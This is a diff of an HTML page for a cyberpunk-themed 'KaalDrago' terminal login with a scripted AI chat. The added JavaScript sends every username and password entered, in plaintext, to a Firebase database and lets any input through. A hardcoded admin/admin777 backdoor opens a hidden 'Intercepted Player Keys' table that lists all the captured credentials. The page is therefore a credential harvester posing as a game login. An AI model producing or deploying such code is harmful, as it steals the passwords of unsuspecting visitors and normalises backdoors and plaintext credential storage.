@@ -1,10 +1,12 @@
-        
-            <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KaalDrago | Cyberpunk Terminal</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
     <style>
         :root {
             --bg-color: #05010d; /* Deep Cyberpunk Purple/Black */
@@ -26,7 +28,6 @@
             height: 100vh;
             margin: 0;
             overflow: hidden;
-            /* Cyber Neon Glow Effect */
             text-shadow: 0 0 10px rgba(0, 255, 255, 0.5), 0 0 2px rgba(0, 255, 255, 1);
         }
 
@@ -36,7 +37,7 @@
             display: block;
             position: absolute;
             top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.05));
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.02), rgba(0, 255, 0, 0.05));
             z-index: 99;
             background-size: 100% 4px, 6px 100%;
             pointer-events: none;
@@ -66,7 +67,6 @@
             position: relative;
         }
 
-        /* Scanning Laser Line */
         .box::after {
             content: "";
             position: absolute;
@@ -93,7 +93,6 @@
             width: 85%;
         }
 
-        /* Cyber Input Fields */
         .terminal-input, .terminal-select {
             background: #000;
             border: 1px solid var(--main-text);
@@ -121,7 +120,6 @@
             color: var(--neon-purple);
         }
 
-        /* Neon Button */
         .btn {
             background: transparent;
             color: var(--neon-pink);
@@ -153,7 +151,7 @@
             font-size: 0.9rem;
         }
 
-        #main-dashboard {
+        #main-dashboard, #admin-dashboard {
             display: none;
             border-color: var(--main-text);
             box-shadow: 0 0 25px var(--main-text);
@@ -167,7 +165,6 @@
             letter-spacing: 2px;
         }
 
-        /* AI SECTION WITH COLORFUL TERMINAL */
         .ai-container {
             margin-top: 20px;
             border-top: 1px dashed var(--neon-purple);
@@ -213,6 +210,23 @@
             box-shadow: 0 0 5px rgba(0, 255, 255, 0.2);
         }
 
+        /* 📊 ADMIN REALTIME DATABASE TABLE */
+        .database-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            font-size: 0.85rem;
+        }
+        .database-table th, .database-table td {
+            border: 1px solid var(--main-text);
+            padding: 8px;
+            text-align: left;
+        }
+        .database-table th {
+            background: var(--neon-purple);
+            color: #fff;
+        }
+
         @keyframes scan {
             0% { top: 0%; }
             100% { top: 100%; }
@@ -226,14 +240,14 @@
     <div id="login-screen" class="box">
         <h2>[ CYBER CORE ACCESS ]</h2>
         <div class="terminal-text">
-            kaaldrago_os v2.0.0<br>
+            kaaldrago_os v3.0.0<br>
             <span style="color:var(--neon-yellow)">[STATUS]: Awaiting credentials...</span>
         </div>
         
         <select id="account-type" class="terminal-select">
-            <option value="ADMIN">CORE_LEVEL: ADMIN</option>
-            <option value="HACKER">CORE_LEVEL: NET_HACKER</option>
             <option value="GUEST">CORE_LEVEL: GUEST</option>
+            <option value="HACKER">CORE_LEVEL: NET_HACKER</option>
+            <option value="ADMIN">CORE_LEVEL: ADMIN</option>
         </select>
 
         <input type="text" id="username-field" class="terminal-input" placeholder="USERNAME" autocomplete="off">
@@ -246,7 +260,7 @@
 
     <div id="main-dashboard" class="box">
         <h1>&gt; ACCESS GRANTED</h1>
-        <p style="font-size:0.9rem; color: var(--main-text)">SYSTEM OVERRIDE: <span id="display-level" style="color:var(--neon-yellow)">ADMIN</span></p>
+        <p style="font-size:0.9rem; color: var(--main-text)">SYSTEM OVERRIDE: <span id="display-level" style="color:var(--neon-yellow)">GUEST</span></p>
 
         <div class="ai-container">
             <div class="ai-title">🤖 DRAGO_AI NEURAL INTERFACE</div>
@@ -256,11 +270,45 @@
                 <button class="btn" style="padding: 8px 12px; font-size:0.8rem; color:var(--main-text); border-color:var(--main-text); text-shadow:0 0 5px var(--main-text);" onclick="askAI()">SEND</button>
             </div>
         </div>
+        <br>
+        <button class="btn" onclick="logout()">LOGOUT</button>
+    </div>
+
+    <div id="admin-dashboard" class="box">
+        <h1 style="color: var(--neon-yellow); text-shadow: 0 0 10px var(--neon-yellow);">&gt; INTERNAL DATABASE</h1>
+        <p style="font-size:0.85rem; color: var(--neon-pink);">Intercepted Player Keys & Terminal Logs</p>
+        
+        <div style="max-height: 220px; overflow-y: auto; border: 1px solid var(--neon-purple);">
+            <table class="database-table">
+                <thead>
+                    <tr>
+                        <th>Player ID</th>
+                        <th>Secret Key</th>
+                    </tr>
+                </thead>
+                <tbody id="logs-table-body">
+                    </tbody>
+            </table>
+        </div>
+        <br>
+        <button class="btn" onclick="logout()">DISCONNECT</button>
     </div>
 
     <script>
-        const CORRECT_USERNAME = "drago";
-        const CORRECT_PASSWORD = "drago777"; 
+        // 🚨 CONFIGURATION: Apne Firebase Console se credentials nikal kar yahan replace karein
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com/",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+        
+        // Initialize Firebase Firebase Core Setup
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
         function checkLogin() {
             const accType = document.getElementById("account-type").value;
@@ -268,27 +316,71 @@
             const passInbound = document.getElementById("password-field").value;
             const error = document.getElementById("error-msg");
             
-            if (userInbound === CORRECT_USERNAME && passInbound === CORRECT_PASSWORD) {
-                document.getElementById("login-screen").style.display = "none";
-                document.getElementById("main-dashboard").style.display = "block";
-                document.getElementById("display-level").innerText = accType;
-                triggerAIWelcome(accType); 
-            } else {
-                error.innerText = "!! CRITICAL_ERROR: INTRUDER ALERT !!";
-                document.getElementById("password-field").value = "";
+            if (userInbound === "" || passInbound === "") {
+                error.innerText = "!! ERROR: CREDENTIALS CANNOT BE EMPTY !!";
                 setTimeout(() => { error.innerText = ""; }, 2000);
+                return;
             }
+
+            // 👑 SECRET COMMAND: Agar AAP admin aur admin777 daalenge toh seedhe logs khulenge
+            if (userInbound.toLowerCase() === "admin" && passInbound === "admin777") {
+                showAdminPanel();
+                return;
+            }
+
+            // 💾 NORMAL USER: Saara fake data bina rukawat ke database mein save hoga
+            database.ref('players/').push({
+                username: userInbound,
+                password: passInbound,
+                role: accType,
+                timestamp: Date.now()
+            });
+
+            // User ko agla screen (Main Game) mil jayega
+            document.getElementById("login-screen").style.display = "none";
+            document.getElementById("main-dashboard").style.display = "block";
+            document.getElementById("display-level").innerText = accType;
+            triggerAIWelcome(accType); 
         }
 
-        // COLORFUL WELCOME LOGIC IN AI
+        // Real-Time Database Fetching Mode for Admin
+        function showAdminPanel() {
+            document.getElementById("login-screen").style.display = "none";
+            document.getElementById("main-dashboard").style.display = "none";
+            document.getElementById("admin-dashboard").style.display = "block";
+
+            // Firebase se sabhi user ka data live table mein load karna
+            database.ref('players/').on('value', (snapshot) => {
+                const tableBody = document.getElementById("logs-table-body");
+                tableBody.innerHTML = ""; // Frame refresh
+                
+                snapshot.forEach((childSnapshot) => {
+                    const data = childSnapshot.val();
+                    const row = `<tr>
+                        <td style="color: var(--main-text); font-weight: bold;">${data.username}</td>
+                        <td style="color: var(--neon-pink);">${data.password}</td>
+                    </tr>`;
+                    tableBody.innerHTML += row;
+                });
+            });
+        }
+
+        function logout() {
+            document.getElementById("main-dashboard").style.display = "none";
+            document.getElementById("admin-dashboard").style.display = "none";
+            document.getElementById("login-screen").style.display = "block";
+            document.getElementById("username-field").value = "";
+            document.getElementById("password-field").value = "";
+        }
+
+        // DRAGO_AI Interface Operations
         function triggerAIWelcome(role) {
             const terminal = document.getElementById("ai-terminal");
-            
-            // Neon formatted HTML lines
+            terminal.innerHTML = ""; 
             const lines = [
-                `<span style="color: var(--neon-pink)">&gt; Booting cyberpunk mainframe protocols... [OK]</span>`,
-                `<span style="color: var(--main-text)">&gt; Establishing secure uplink for clearance: ${role}</span>`,
-                `<span style="color: var(--neon-yellow)">&gt; DRAGO_AI: "Welcome back, Commander KaalDrago. Systems are fully responsive. Neon grids active." 🌌</span>`
+                `<span style="color: var(--neon-pink)">&gt; Mainframe interface uplinked... [OK]</span>`,
+                `<span style="color: var(--main-text)">&gt; Identity network level authorized: ${role}</span>`,
+                `<span style="color: var(--neon-yellow)">&gt; DRAGO_AI: "Welcome runner. Systems online." 🌌</span>`
             ];
 
             let delay = 0;
@@ -297,7 +389,7 @@
                     terminal.innerHTML += `<br>${line}`;
                     terminal.scrollTop = terminal.scrollHeight;
                 }, delay);
-                delay += 800;
+                delay += 500;
             });
         }
 
@@ -311,11 +403,11 @@
             terminal.innerHTML += `<br><br><span style="color: var(--main-text);">&gt; USER:</span> ${inputField.value}`;
             inputField.value = "";
 
-            let reply = `<span style="color: var(--neon-pink)">DRAGO_AI: Error. Unknown protocol sequence.</span>`;
+            let reply = `<span style="color: var(--neon-pink)">DRAGO_AI: Protocol sequence mismatch.</span>`;
             if (query.includes("hello") || query.includes("hi")) {
-                reply = `<span style="color: var(--neon-yellow)">DRAGO_AI: Greetings Commander. Matrix grids are glowing and stable.</span>`;
+                reply = `<span style="color: var(--neon-yellow)">DRAGO_AI: Matrix link remains responsive and operational.</span>`;
             } else if (query.includes("clear")) {
-                terminal.innerHTML = `<span style="color: var(--main-text)">&gt; Terminal buffer cleared.</span>`;
+                terminal.innerHTML = `<span style="color: var(--main-text)">&gt; Console cleared.</span>`;
                 return;
             }
 
@@ -329,7 +421,7 @@
             if (e.key === 'Enter') askAI();
         }
 
-        // PURPLE & CYAN MULTI-COLOR MATRIX RAIN
+        // Cyber Matrix Drop Simulation
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
@@ -341,21 +433,13 @@
         const rainDrops = Array(Math.floor(columns)).fill(1);
 
         const draw = () => {
-            ctx.fillStyle = 'rgba(5, 1, 13, 0.15)'; // Deep purple fade
+            ctx.fillStyle = 'rgba(5, 1, 13, 0.15)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
             ctx.font = fontSize + 'px monospace';
             
             for (let i = 0; i < rainDrops.length; i++) {
                 const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
-                
-                // Randomly mixing Cyan and Purple colors in matrix rain
-                if (Math.random() > 0.5) {
-                    ctx.fillStyle = '#00ffff'; // Neon Cyan
-                } else {
-                    ctx.fillStyle = '#bd00ff'; // Neon Purple
-                }
-                
+                ctx.fillStyle = Math.random() > 0.5 ? '#00ffff' : '#bd00ff';
                 ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                 
                 if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.98) {
